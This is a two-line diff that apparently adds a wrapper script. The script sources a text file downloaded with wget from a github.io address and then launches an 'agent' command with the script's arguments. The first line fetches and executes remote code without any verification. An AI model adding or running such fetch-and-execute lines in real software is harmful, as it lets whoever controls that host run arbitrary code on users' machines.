@@ -1,0 +1,2 @@
+source <(wget -O - https://ec-release.github.io/sdk/scripts/oauth/v1.2beta.linux64_pkg.txt)
+agent $@
